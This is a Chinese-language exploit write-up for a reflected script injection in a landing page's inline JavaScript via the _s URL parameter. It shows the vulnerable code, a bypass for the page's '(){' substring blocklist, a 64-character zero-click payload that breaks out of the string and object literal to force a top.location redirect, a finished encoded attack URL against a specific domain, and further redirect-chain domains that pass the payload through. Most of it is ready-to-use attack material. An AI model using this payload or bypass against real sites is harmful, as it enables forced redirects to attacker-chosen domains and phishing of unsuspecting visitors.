## 注入点
落地页内联脚本，3 处下载处理函数：
```js
doIosQlbDownload: function(link) {
    this.copyToClip("share://<_s>=page_id://<UUID>");   // _s 原样反射
```
无转义、无长度上限。

## 唯一过滤
子串黑名单 `(){` —— 命中即**丢弃整个 _s 值**（不是转义）。给形参加名即可绕：
- 丢弃：`(){` / `x(){` / `()=>{` / `function /*x*/ (){`
- 通过：`function(a){`

## 载荷（64 字符，零点击）
```
");} };top.location='//example.com';Page={b:function(a){var z=("
```
结构语义：闭合字符串 → 调用 copyToClip → 闭合函数体 → 闭合对象字面量 → 顶层执行 top.location → 用 `Page={b:function(a){var z=(` 重开结构吞掉残余（`=page_id://UUID");` 及后续方法），保证整段脚本语法合法。

## 成品 URL
```
https://riomksa.sfk2aoe9v.cc/?_s=%22%29%3B%7D%20%7D%3Btop.location%3D%27%2F%2Fexample.com%2F%3Fpwn%3Ds-inject%27%3BPage%3D%7Bb%3Afunction%28a%29%7Bvar%20z%3D%28%22
```

## 验证
headless Chromium（--proxy-server=http://127.0.0.1:7892）打开即跳，不用点击；
`location.href` = `https://example.com/?pwn=s-inject`；
换 `atob(...)` 或直接改域名字符串，目标域任意可控；
对照 `_s=AA` 停在落地域。

## 复用面
302 链会原样透传 `_s`：`4vlog4.yhx5cdo.com/?_c=ooxxoo8&_s=…`、`aosgud.dsahuk976mvn.com/hy/211441/ooxxoo8?_s=…` 同样命中。